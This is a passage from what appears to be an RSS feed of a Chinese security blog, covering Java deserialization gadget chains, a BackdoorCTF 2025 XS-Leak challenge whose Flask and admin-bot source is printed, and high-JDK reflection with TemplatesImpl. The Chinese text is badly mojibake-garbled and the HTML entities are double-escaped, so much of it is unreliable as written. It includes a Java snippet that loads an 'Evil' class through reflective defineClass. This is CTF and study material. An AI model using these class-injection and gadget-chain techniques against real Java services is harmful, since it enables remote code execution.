é«˜ç‰ˆæœ¬ BadAttributeValueExpException ä¸èƒ½è§¦å‘ toString äº†ï¼Œå¯»æ‰¾ä¸€ä¸ªæ›¿æ¢çš„ç±»ï¼Œä¹‹å‰å­¦åˆ°è¿‡åœ¨EventListenerList#readObjectä¸­æœ‰ä¸€ä¸ª add æ–¹æ³•ï¼Œä¼šåŠ¨æ€åŠ è½½å¹¶ç›‘å¬ç±»ï¼Œå¯ä»¥è§¦å‘ toString â€¦</content:encoded></item><item><title>BackdoorCTF 2025</title><link>https://baozongwi.xyz/p/backdoorctf-2025/</link><guid>https://baozongwi.xyz/p/backdoorctf-2025/</guid><pubDate>Wed, 10 Dec 2025 22:49:38 +0800</pubDate><description>Go Touch Grass ä¸€é“ XS-Leak çš„é¢˜ç›®ï¼Œå°±æ˜¯åˆ©ç”¨æ‡’åŠ è½½æ¥å¤„ç†
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 from flask import Flask, request, make_response, render_template_string import os, base64, sys, threading, time, jsonify, nh3 from selenium import webdriver from selenium.webdriver.chrome.options import Options from flask_limiter import Limiter from flask_limiter.util import get_remote_address app = Flask(__name__) PORT = 6005 flag = open(&amp;amp;#39;flag.txt&amp;amp;#39;).read().strip() # flag charset is string.ascii_lowercase + string.digits ALLOWED_TAGS = { &amp;amp;#39;a&amp;amp;#39;, &amp;amp;#39;b&amp;amp;#39;, &amp;amp;#39;blockquote&amp;amp;#39;, &amp;amp;#39;br&amp;amp;#39;, &amp;amp;#39;code&amp;amp;#39;, &amp;amp;#39;div&amp;amp;#39;, &amp;amp;#39;em&amp;amp;#39;, &amp;amp;#39;h1&amp;amp;#39;, &amp;amp;#39;h2&amp;amp;#39;, &amp;amp;#39;h3&amp;amp;#39;, &amp;amp;#39;i&amp;amp;#39;, &amp;amp;#39;iframe&amp;amp;#39;, &amp;amp;#39;img&amp;amp;#39;, &amp;amp;#39;li&amp;amp;#39;, &amp;amp;#39;link&amp;amp;#39;, &amp;amp;#39;ol&amp;amp;#39;, &amp;amp;#39;p&amp;amp;#39;, &amp;amp;#39;pre&amp;amp;#39;, &amp;amp;#39;span&amp;amp;#39;, &amp;amp;#39;strong&amp;amp;#39;, &amp;amp;#39;ul&amp;amp;#39; } ALLOWED_ATTRIBUTES = { &amp;amp;#39;a&amp;amp;#39;: {&amp;amp;#39;href&amp;amp;#39;, &amp;amp;#39;target&amp;amp;#39;}, &amp;amp;#39;link&amp;amp;#39;: {&amp;amp;#39;rel&amp;amp;#39;, &amp;amp;#39;href&amp;amp;#39;, &amp;amp;#39;type&amp;amp;#39;, &amp;amp;#39;as&amp;amp;#39;}, &amp;amp;#39;*&amp;amp;#39;: { &amp;amp;#39;style&amp;amp;#39;,&amp;amp;#39;src&amp;amp;#39;, &amp;amp;#39;width&amp;amp;#39;, &amp;amp;#39;height&amp;amp;#39;, &amp;amp;#39;alt&amp;amp;#39;, &amp;amp;#39;title&amp;amp;#39;, &amp;amp;#39;lang&amp;amp;#39;, &amp;amp;#39;dir&amp;amp;#39;, &amp;amp;#39;loading&amp;amp;#39;, &amp;amp;#39;role&amp;amp;#39;, &amp;amp;#39;aria-label&amp;amp;#39; } } APP_LIMIT_TIME = 60 APP_LIMIT_COUNT = 5 limiter = Limiter( get_remote_address, app=app, storage_uri=&amp;amp;#34;memory://&amp;amp;#34; ) @app.errorhandler(429) def ratelimit_handler(e): return jsonify({ &amp;amp;#34;error&amp;amp;#34;: f&amp;amp;#34;Too many requests, please try again later. Limit is {APP_LIMIT_COUNT} requests per {APP_LIMIT_TIME} seconds.&amp;amp;#34; }), 429 template = &amp;amp;#34;&amp;amp;#34;&amp;amp;#34;&amp;amp;lt;!DOCTYPE html&amp;amp;gt; &amp;amp;lt;html&amp;amp;gt; &amp;amp;lt;head&amp;amp;gt; &amp;amp;lt;/head&amp;amp;gt; &amp;amp;lt;body&amp;amp;gt; &amp;amp;lt;div class=&amp;amp;#34;head&amp;amp;#34;&amp;amp;gt;&amp;amp;lt;/div&amp;amp;gt; {% if flag %} &amp;amp;lt;div class=&amp;amp;#34;flag&amp;amp;#34;&amp;amp;gt;&amp;amp;lt;h1&amp;amp;gt;{{ flag }}&amp;amp;lt;/h1&amp;amp;gt;&amp;amp;lt;/div&amp;amp;gt; {% endif %} {% if note %} &amp;amp;lt;div class=&amp;amp;#34;note&amp;amp;#34;&amp;amp;gt;{{ note | safe}}&amp;amp;lt;/div&amp;amp;gt; {% endif %} &amp;amp;lt;script nonce=&amp;amp;#34;{{ nonce }}&amp;amp;#34;&amp;amp;gt; Array.from(document.getElementsByClassName(&amp;amp;#39;flag&amp;amp;#39;)).forEach(function(element) { let text = element.innerText; element.innerHTML = &amp;amp;#39;&amp;amp;#39;; for (let i = 0; i &amp;amp;lt; text.length; i++) { let charElem = document.createElement(&amp;amp;#39;span&amp;amp;#39;); charElem.innerText = text[i]; element.appendChild(charElem); } }); &amp;amp;lt;/script&amp;amp;gt; &amp;amp;lt;/body&amp;amp;gt; &amp;amp;lt;/html&amp;amp;gt; &amp;amp;#34;&amp;amp;#34;&amp;amp;#34; @app.route(&amp;amp;#39;/&amp;amp;#39;, methods=[&amp;amp;#39;GET&amp;amp;#39;]) def index(): _flag = request.cookies.get(&amp;amp;#39;flag&amp;amp;#39;, None) nonce = base64.b64encode(os.urandom(32)).decode(&amp;amp;#39;utf-8&amp;amp;#39;) _note = request.args.get(&amp;amp;#39;note&amp;amp;#39;, &amp;amp;#39;Try putting your note with /?note=..&amp;amp;#39;) clean_note = nh3.clean( _note, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRIBUTES, ) rendered = render_template_string( template, nonce=nonce, flag=_flag, note=clean_note, ) response = make_response(rendered) response.headers[&amp;amp;#39;Content-Security-Policy&amp;amp;#39;] = ( f&amp;amp;#34;default-src &amp;amp;#39;none&amp;amp;#39;; script-src &amp;amp;#39;nonce-{nonce}&amp;amp;#39;; style-src &amp;amp;#39;none&amp;amp;#39;; &amp;amp;#34; &amp;amp;#34;base-uri &amp;amp;#39;none&amp;amp;#39;; frame-ancestors &amp;amp;#39;self&amp;amp;#39;; frame-src &amp;amp;#39;self&amp;amp;#39;; object-src &amp;amp;#39;none&amp;amp;#39;; &amp;amp;#34; ) response.headers[&amp;amp;#39;Referrer-Policy&amp;amp;#39;] = &amp;amp;#39;no-referrer&amp;amp;#39; response.headers[&amp;amp;#39;X-Frame-Options&amp;amp;#39;] = &amp;amp;#39;SAMEORIGIN&amp;amp;#39; response.headers[&amp;amp;#39;X-Content-Type-Options&amp;amp;#39;] = &amp;amp;#39;nosniff&amp;amp;#39; return response def admin_visit(raw_data_b64: str): try: try: data = base64.b64decode(raw_data_b64.encode(&amp;amp;#39;utf-8&amp;amp;#39;)).decode(&amp;amp;#39;utf-8&amp;amp;#39;) except Exception as e: print(f&amp;amp;#34;[BOT] base64 decode error: {e}&amp;amp;#34;, file=sys.stderr) return url = f&amp;amp;#34;http://127.0.0.1:6005/?note={data}&amp;amp;#34; print(f&amp;amp;#34;[BOT] Visiting {url}&amp;amp;#34;, file=sys.stderr) options = Options() options.add_argument(&amp;amp;#34;--headless&amp;amp;#34;) options.add_argument(&amp;amp;#34;--no-sandbox&amp;amp;#34;) options.add_argument(&amp;amp;#34;--disable-dev-shm-usage&amp;amp;#34;) options.add_argument(&amp;amp;#34;--disable-gpu&amp;amp;#34;) driver = webdriver.Chrome(options=options) try: driver.get(&amp;amp;#34;http://127.0.0.1:6005/&amp;amp;#34;) driver.add_cookie({ &amp;amp;#39;name&amp;amp;#39;: &amp;amp;#39;flag&amp;amp;#39;, &amp;amp;#39;value&amp;amp;#39;: flag.replace(&amp;amp;#34;{&amp;amp;#34;, &amp;amp;#34;&amp;amp;#34;).replace(&amp;amp;#34;}&amp;amp;#34;, &amp;amp;#34;&amp;amp;#34;), &amp;amp;#39;path&amp;amp;#39;: &amp;amp;#39;/&amp;amp;#39;, &amp;amp;#39;httpOnly&amp;amp;#39;: True, &amp;amp;#39;sameSite&amp;amp;#39;: &amp;amp;#39;Strict&amp;amp;#39; }) print(f&amp;amp;#34;[BOT] Now visiting target URL {url}&amp;amp;#34;, file=sys.stderr) driver.set_page_load_timeout(5) try: driver.get(url) except Exception as e: print(f&amp;amp;#34;[BOT] error during driver.get: {e}&amp;amp;#34;, file=sys.stderr) time.sleep(5) finally: driver.quit() print(f&amp;amp;#34;[BOT] Done visiting URL {url}&amp;amp;#34;, file=sys.stderr) except Exception as e: print(f&amp;amp;#34;[BOT] Unexpected bot error: {e}&amp;amp;#34;, file=sys.stderr) @app.route(&amp;amp;#39;/bot&amp;amp;#39;, methods=[&amp;amp;#39;GET&amp;amp;#39;]) @limiter.limit(f&amp;amp;#34;{APP_LIMIT_COUNT} per {APP_LIMIT_TIME} second&amp;amp;#34;) def bot(): raw_data = request.args.get(&amp;amp;#39;note&amp;amp;#39;) if not raw_data: return make_response(&amp;amp;#34;Missing ?note parameter\n&amp;amp;#34;, 400) t = threading.Thread(target=admin_visit, args=(raw_data,)) t.daemon = True t.start() return make_response(&amp;amp;#34;Admin will visit this URL soon.\n&amp;amp;#34;, 202) if __name__ == &amp;amp;#39;__main__&amp;amp;#39;: app.run(port=PORT, debug=False, host=&amp;amp;#39;0.0.0.0&amp;amp;#39;) ä¸ºäº†æ–¹ä¾¿å¯åŠ¨å®¹å™¨ï¼Œå°† dockerfile åŠ ä¸Šä»£ç†</description><content:encoded>Go Touch Grass ä¸€é“ XS-Leak çš„é¢˜ç›®ï¼Œå°±æ˜¯åˆ©ç”¨æ‡’åŠ è½½æ¥å¤„ç†
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 â€¦</content:encoded></item><item><title>é«˜ç‰ˆæœ¬ Jdk åå°„ &amp; TemplatesImpl</title><link>https://baozongwi.xyz/p/high-jdk-reflection-templatesimpl/</link><guid>https://baozongwi.xyz/p/high-jdk-reflection-templatesimpl/</guid><pubDate>Wed, 10 Dec 2025 08:50:24 +0800</pubDate><description>ç°åœ¨å®é™…çš„ CTF å…¶å®åŸºæœ¬éƒ½æ˜¯é«˜ç‰ˆæœ¬ååºåˆ—åŒ–ï¼Œä½ç‰ˆæœ¬ç”Ÿæ´»ä¸­æœ‰ï¼Œä½†æ˜¯ä¹Ÿå¾ˆå°‘äº†ï¼Œä¹‹å‰æœ‰ç”¨è¿‡è¿™ç±»çŸ¥è¯†å»è§£é¢˜ï¼Œä½†æ˜¯ä¸å¤ªç†è§£ä¸ºä»€ä¹ˆï¼Œç°åœ¨æ¥å­¦ä¹ ä¸‹
æœ¬æ–‡ä¸­æ¶‰åŠçš„ TemplatesImpl çŸ¥è¯†å¹¶éé«˜ç‰ˆæœ¬ï¼Œå› ä¸ºé«˜ç‰ˆæœ¬ä¸­éœ€è¦org.springframework.aop.framework.JdkDynamicAopProxyä»£ç†è§£å†³å…¶ç¨³å®šæ€§ï¼Œä½†æ˜¯è¿™ä¸ªç±»åœ¨spring-aopä¾èµ–ä¸­ã€‚
åå°„ jdk9 ä¹‹åçš„æ¨¡å—åŒ– Javaæ¨¡å—åŒ–ä¸»è¦æ˜¯ç”¨æ¥è§£å†³ä¾èµ–çš„é—®é¢˜ï¼Œä»¥åŠç»™åŸç”ŸJDKç˜¦èº«è¿™ä¸¤ä¸ªä½œç”¨ã€‚
åœ¨æ­¤ä¹‹å‰ï¼ŒJava é¡¹ç›®ç”±ä¸€å † JAR åŒ…ç»„æˆã€‚JVM å¹¶ä¸å…³å¿ƒ JAR åŒ…ä¹‹é—´çš„ä¾èµ–å…³ç³»ï¼Œåªè´Ÿè´£æŠŠå®ƒä»¬è§£å‹å‡ºçš„ class æ–‡ä»¶å †åœ¨ Classpath ä¸‹ã€‚ä¸€æ—¦æ¼ä¼ äº†æŸä¸ªä¾èµ– JARï¼Œç¨‹åºåªèƒ½åœ¨è¿è¡Œæ—¶æŠ›å‡º ClassNotFoundException å´©æºƒã€‚
JDK 9 å¼•å…¥æ¨¡å—åŒ–åï¼Œå¦‚æœæ¨¡å— A ä¾èµ–æ¨¡å— Bï¼Œå¿…é¡»åœ¨module-info.classä¸­æ˜¾å¼å£°æ˜ã€‚è¿™è®© JVM åœ¨å¯åŠ¨æ—¶å°±èƒ½å®šä½å¹¶éªŒè¯æ‰€æœ‰ä¾èµ–ã€‚
åœ¨ JDK 9 ä¹‹å‰ï¼Œåªè¦åˆ©ç”¨åå°„ï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—®ä»»ä½•ç±»ï¼ˆpublic/privateï¼‰ã€‚ä½†åœ¨æ¨¡å—åŒ–ä¹‹åï¼Œè®¿é—®æƒé™è¢«ä¸¥æ ¼é™åˆ¶åœ¨æ¨¡å—å†…éƒ¨ã€‚é™¤éç›®æ ‡æ¨¡å—åœ¨ module-info ä¸­æ˜¾å¼ exportsæˆ–opensäº†æŸä¸ªåŒ…ï¼Œå¦åˆ™å¤–éƒ¨æ— æ³•é€šè¿‡åå°„è®¿é—®å…¶ä¸­çš„ç±»ï¼Œç”šè‡³è¿setAccessible(true)éƒ½ä¼šå¤±æ•ˆã€‚ è¿™ç›´æ¥å¯¼è‡´äº†å¤§é‡ä¾èµ–ç§æœ‰å±æ€§ä¿®æ”¹çš„ Gadget é“¾åœ¨é«˜ç‰ˆæœ¬ JDK ä¸­æ–­è£‚ã€‚
jdk17 çš„å¼ºå°è£… Oracleå®˜æ–¹ä¸Šè¿°æ–‡æ¡£ä¸­æåˆ°äº†Strong Encapsulationï¼Œè¿™ä¸ªä¸»è¦å°±æ˜¯é’ˆå¯¹java*åŒ…ä¸‹çš„æ‰€æœ‰épublicå­—æ®µçš„å¦‚æœæˆ‘ä»¬åœ¨JDK17çš„æ—¶å€™å¯¹java*ä¸‹çš„éå…¬å…±å­—æ®µè¿›è¡Œåå°„è°ƒç”¨çš„è¯å°±ä¼šç›´æ¥æŠ¥é”™ã€‚
å…¶å®è¿™ä¸ªä¸œè¥¿åœ¨JDK9ä¹‹åå°±å¼€å§‹è¢«æ ‡è®°ä¸ºäº†ä¸å®‰å…¨é€‰é¡¹,ä½†æ˜¯ç”±äºå¾ˆå¤šå¤§å‹é¡¹ç›®ä¹‹å‰è¿˜æ˜¯ç›´æ¥ä½¿ç”¨åå°„è¿™ä¸ªåŠŸèƒ½ï¼Œç›´åˆ°JDK17æ‰å°†å…¶å¼ºåˆ¶åŒ–ã€‚
æµ‹è¯•ç±»
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package org.example; import javassist.ClassPool; import javassist.CtClass; import java.lang.reflect.Method; public class test { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass evilClass = pool.get(&amp;amp;#34;Evil&amp;amp;#34;); evilClass.setName(&amp;amp;#34;Evil&amp;amp;#34; + System.nanoTime()); byte[] bytecodes = evilClass.toBytecode(); Method defineClass= ClassLoader.class.getDeclaredMethod(&amp;amp;#34;defineClass&amp;amp;#34;, String.class, byte[].class, int.class, int.class); defineClass.setAccessible(true); defineClass.invoke(ClassLoader.getSystemClassLoader(), &amp;amp;#34;attack&amp;amp;#34;, bytecodes, 0, bytecodes.length); } } æ¶æ„ç±»</description><content:encoded>ç°åœ¨å®é™…çš„ CTF å…¶å®åŸºæœ¬éƒ½æ˜¯é«˜ç‰ˆæœ¬ååºåˆ—åŒ–ï¼Œä½ç‰ˆæœ¬ç”Ÿæ´»ä¸­æœ‰ï¼Œä½†æ˜¯ä¹Ÿå¾ˆå°‘äº†ï¼Œä¹‹å‰æœ‰ç”¨è¿‡è¿™ç±»çŸ¥è¯†å»è§£é¢˜ï¼Œä½†æ˜¯ä¸å¤ªç†è§£ä¸ºä»€ä¹ˆï¼Œç°åœ¨æ¥å­¦ä¹ ä¸‹
æœ¬æ–‡ä¸­æ¶‰åŠçš„ TemplatesImpl çŸ¥è¯†å¹¶éé«˜ç‰ˆæœ¬ï¼Œå› ä¸ºé«˜ç‰ˆæœ¬ä¸­éœ€ â€¦</content:encoded></item></channel></rss>